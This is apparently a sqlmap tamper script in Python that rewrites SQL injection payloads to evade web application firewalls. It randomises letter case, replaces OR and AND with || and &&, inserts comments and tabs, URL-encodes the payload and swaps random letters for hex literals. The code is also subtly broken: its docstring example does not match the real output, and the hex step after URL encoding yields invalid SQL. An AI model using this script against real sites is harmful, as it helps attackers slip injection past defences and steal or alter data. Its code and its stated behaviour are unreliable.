#!/usr/bin/env python

from lib.core.enums import PRIORITY
import re
import random
import urllib.parse

__priority__ = PRIORITY.NORMAL

def dependencies():
    pass

def tamper(payload, **kwargs):
    """
    Advanced tamper script that obfuscates 'OR' and 'AND' by replacing them with '||' and '&&',
    applies random case changes, URL encoding, and whitespace manipulation to evade WAFs.

    Example:
    >>> tamper("SELECT * FROM users WHERE username = 'admin' OR 1=1 --")
    "SELECT * FROM users WHERE username = 'admin' || 1=1 --"
    """
    
    # Ensure payload is valid
    if not payload:
        return payload

    # Randomize case of the payload (to bypass case-sensitive filters)
    payload = ''.join(random.choice([char.upper(), char.lower()]) if char.isalpha() else char for char in payload)

    # Replace 'OR' and 'AND' with logical operators '||' and '&&'
    payload = re.sub(r'\bOR\b', '||', payload, flags=re.IGNORECASE)
    payload = re.sub(r'\bAND\b', '&&', payload, flags=re.IGNORECASE)

    # Add random spaces or comments between characters to break up keywords
    payload = re.sub(r'\s', lambda match: random.choice(['/**/', ' ', '\t']), payload)

    # URL-encode parts of the payload to further obfuscate it
    payload = urllib.parse.quote(payload)

    # Optionally, replace characters with their hexadecimal equivalents
    hex_payload = ""
    for char in payload:
        if random.choice([True, False]) and char.isalpha():
            hex_payload += "0x{:02x}".format(ord(char))
        else:
            hex_payload += char
    payload = hex_payload

    return payload
